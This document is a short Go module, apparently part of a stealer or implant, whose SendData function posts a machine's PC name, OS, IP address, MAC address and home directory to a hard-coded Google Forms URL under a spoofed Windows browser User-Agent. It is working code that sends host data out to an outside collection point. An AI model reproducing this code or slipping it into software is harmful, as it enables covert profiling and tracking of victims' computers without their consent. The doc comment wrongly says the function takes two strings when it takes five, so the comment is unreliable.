package Modules

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

var FormPcName = "entry.2005620554"
var FormOS = "entry.1045781291"
var FormIP = "entry.1065046570"
var FormMacAdress = "entry.1166974658"
var FormHomeDir = "entry.839337160"

const form = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfFF9TKcj6CAZ-6ucrg-SyrKY3vcAsddOcleOIye-NsfDk3hQ/formResponse"

// SendData sends the provided data to a Google Form using HTTP POST request.
// The function takes two strings 'a' and 'b', which are added to the form fields
// with specific entry IDs corresponding to the Google Form's field names.
// It sets the appropriate headers for the request and uses an HTTP client
// to submit the form data.
// If there's an error creating the request, it prints an error message.
func SendData(a string, b string, c string, d string, e string) {
	data := url.Values{} // Le plus simple pour envoyer au form c'est de faire une map et pas un array

	data.Add(FormPcName, a) // entry.* = au nom du champ dans le googleform
	data.Add(FormOS, b)
	data.Add(FormIP, c)
	data.Add(FormMacAdress, d)
	data.Add(FormHomeDir, e)

	req, error := http.NewRequest("POST", form, strings.NewReader(data.Encode())) // obliger d'encode pour l'http
	if error != nil {
		fmt.Println("prblm")
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	client := &http.Client{}
	client.Do(req)

	fmt.Println("Inshallah le form il est la")

}
